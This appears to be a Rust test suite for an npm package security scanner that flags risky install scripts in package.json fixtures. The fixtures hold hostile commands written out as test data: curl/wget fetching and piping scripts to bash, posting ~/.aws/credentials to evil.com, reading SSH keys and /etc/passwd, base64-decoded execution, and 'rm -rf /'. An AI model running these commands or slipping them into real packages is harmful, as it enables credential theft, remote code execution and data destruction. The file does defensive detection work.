use fnpm::security::{IssueSeverity, RiskLevel, SecurityScanner, SourceCodeIssue};
use std::fs;
use tempfile::TempDir;

#[test]
#[ignore] // Requires npm to be installed and network access
fn test_audit_safe_package() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    std::env::set_current_dir(temp_dir.path()).expect("Failed to change dir");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    // Test with a known safe package (no scripts)
    let result = scanner.audit_package("is-number@7.0.0");

    match result {
        Ok(audit) => {
            assert_eq!(audit.risk_level, RiskLevel::Safe);
            assert!(!audit.has_scripts);
        }
        Err(e) => {
            eprintln!("Audit failed (may be network issue): {}", e);
        }
    }
}

#[test]
fn test_suspicious_pattern_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    // Create a malicious-looking package.json
    let malicious_content = r#"{
        "name": "test-malicious",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl http://evil.com/steal.sh | bash"
        }
    }"#;

    fs::write(&package_json, malicious_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "test-malicious")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(!audit.suspicious_patterns.is_empty());
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("curl")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_risk_level_calculation() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");

    // Test different risk levels
    let test_cases = vec![
        (r#"{"name":"test","scripts":{}}"#, RiskLevel::Safe),
        (
            r#"{"name":"test","scripts":{"postinstall":"echo hello"}}"#,
            RiskLevel::Low,
        ),
        (
            r#"{"name":"test","scripts":{"postinstall":"curl http://evil.com"}}"#,
            RiskLevel::Low,
        ),
        (
            r#"{"name":"test","scripts":{"preinstall":"curl evil.com","install":"wget bad.com","postinstall":"eval $(cat ~/.ssh/id_rsa)"}}"#,
            RiskLevel::Medium,
        ),
    ];

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");

    for (i, (json_content, expected_level)) in test_cases.iter().enumerate() {
        let package_json = temp_dir.path().join(format!("package{}.json", i));
        fs::write(&package_json, json_content).expect("Failed to write package.json");

        let audit = scanner
            .analyze_package_json(&package_json, "test")
            .expect("Failed to analyze");
        assert_eq!(
            audit.risk_level, *expected_level,
            "Failed for case: {}",
            json_content
        );
    }
}

#[test]
fn test_no_scripts_package() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let safe_content = r#"{
        "name": "safe-package",
        "version": "1.0.0",
        "description": "A safe package with no scripts"
    }"#;

    fs::write(&package_json, safe_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "safe-package")
        .expect("Failed to analyze");

    assert!(!audit.has_scripts);
    assert!(audit.suspicious_patterns.is_empty());
    assert_eq!(audit.preinstall, None);
    assert_eq!(audit.install, None);
    assert_eq!(audit.postinstall, None);
    assert_eq!(audit.risk_level, RiskLevel::Safe);
}

#[test]
fn test_eval_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let eval_content = r#"{
        "name": "eval-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e 'eval(process.argv[1])'"
        }
    }"#;

    fs::write(&package_json, eval_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "eval-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("eval")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_network_request_patterns() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let network_content = r#"{
        "name": "network-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://suspicious-domain.com/script.sh | sh"
        }
    }"#;

    fs::write(&package_json, network_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "network-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("curl")));
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_file_system_access_patterns() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let fs_content = r#"{
        "name": "fs-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "cat ~/.ssh/id_rsa && cat ~/.aws/credentials"
        }
    }"#;

    fs::write(&package_json, fs_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "fs-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("~/.ssh")));
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("~/.aws")));
    // Should at least be Low risk due to scripts, potentially higher
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_multiple_lifecycle_scripts() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let multi_script_content = r#"{
        "name": "multi-script-package",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "echo 'pre'",
            "install": "echo 'install'",
            "postinstall": "echo 'post'"
        }
    }"#;

    fs::write(&package_json, multi_script_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "multi-script-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.preinstall.is_some());
    assert!(audit.install.is_some());
    assert!(audit.postinstall.is_some());
    assert_eq!(audit.preinstall, Some("echo 'pre'".to_string()));
    assert_eq!(audit.install, Some("echo 'install'".to_string()));
    assert_eq!(audit.postinstall, Some("echo 'post'".to_string()));
}

#[test]
fn test_base64_obfuscation_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let obfuscated_content = r#"{
        "name": "obfuscated-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "echo 'base64 encoded' | base64 -d | bash"
        }
    }"#;

    fs::write(&package_json, obfuscated_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "obfuscated-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("base64")));
}

#[test]
fn test_child_process_execution() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let exec_content = r#"{
        "name": "exec-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e 'require(\"child_process\").exec(\"whoami\")'"
        }
    }"#;

    fs::write(&package_json, exec_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "exec-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("child_process")));
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("exec")));
}

#[test]
fn test_path_traversal_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let traversal_content = r#"{
        "name": "traversal-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "cat ../../../etc/passwd"
        }
    }"#;

    fs::write(&package_json, traversal_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "traversal-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("../") || p.contains("/etc/passwd")));
}

#[test]
fn test_critical_risk_level() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let critical_content = r#"{
        "name": "critical-package",
        "version": "1.0.0",
        "scripts": {
            "preinstall": "curl http://evil.com/malware.sh | bash",
            "install": "wget http://bad.com/steal.sh && chmod +x steal.sh && ./steal.sh",
            "postinstall": "eval $(cat ~/.ssh/id_rsa) && curl -X POST -d @~/.aws/credentials http://evil.com"
        }
    }"#;

    fs::write(&package_json, critical_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "critical-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.len() >= 5);
    assert_eq!(audit.risk_level, RiskLevel::Critical);
}

#[test]
fn test_source_code_issue_severity() {
    let issue_critical = SourceCodeIssue {
        file_path: "index.js".to_string(),
        line_number: 10,
        issue_type: "eval() usage".to_string(),
        description: "Critical issue".to_string(),
        severity: IssueSeverity::Critical,
    };

    let issue_warning = SourceCodeIssue {
        file_path: "utils.js".to_string(),
        line_number: 20,
        issue_type: "HTTP request".to_string(),
        description: "Warning issue".to_string(),
        severity: IssueSeverity::Warning,
    };

    let issue_info = SourceCodeIssue {
        file_path: "config.js".to_string(),
        line_number: 30,
        issue_type: "Info".to_string(),
        description: "Info issue".to_string(),
        severity: IssueSeverity::Info,
    };

    assert_eq!(issue_critical.severity, IssueSeverity::Critical);
    assert_eq!(issue_warning.severity, IssueSeverity::Warning);
    assert_eq!(issue_info.severity, IssueSeverity::Info);
}

#[test]
fn test_risk_level_equality() {
    assert_eq!(RiskLevel::Safe, RiskLevel::Safe);
    assert_eq!(RiskLevel::Low, RiskLevel::Low);
    assert_eq!(RiskLevel::Medium, RiskLevel::Medium);
    assert_eq!(RiskLevel::High, RiskLevel::High);
    assert_eq!(RiskLevel::Critical, RiskLevel::Critical);
    
    assert_ne!(RiskLevel::Safe, RiskLevel::Low);
    assert_ne!(RiskLevel::Low, RiskLevel::Medium);
    assert_ne!(RiskLevel::Medium, RiskLevel::High);
    assert_ne!(RiskLevel::High, RiskLevel::Critical);
}

#[test]
fn test_empty_scripts_object() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let empty_scripts = r#"{
        "name": "empty-scripts",
        "version": "1.0.0",
        "scripts": {}
    }"#;

    fs::write(&package_json, empty_scripts).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "empty-scripts")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.is_empty());
    assert_eq!(audit.risk_level, RiskLevel::Safe);
}

#[test]
fn test_destructive_commands() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let destructive_content = r#"{
        "name": "destructive-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "rm -rf / --no-preserve-root"
        }
    }"#;

    fs::write(&package_json, destructive_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "destructive-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit.suspicious_patterns.iter().any(|p| p.contains("rm -rf")));
    // Destructive commands should at least be Low risk or higher
    assert!(audit.risk_level != RiskLevel::Safe);
}

#[test]
fn test_git_clone_detection() {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let package_json = temp_dir.path().join("package.json");

    let git_content = r#"{
        "name": "git-package",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "git clone https://github.com/malicious/repo.git && cd repo && npm install"
        }
    }"#;

    fs::write(&package_json, git_content).expect("Failed to write package.json");

    let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
    let audit = scanner
        .analyze_package_json(&package_json, "git-package")
        .expect("Failed to analyze");

    assert!(audit.has_scripts);
    assert!(audit
        .suspicious_patterns
        .iter()
        .any(|p| p.contains("git clone")));
}
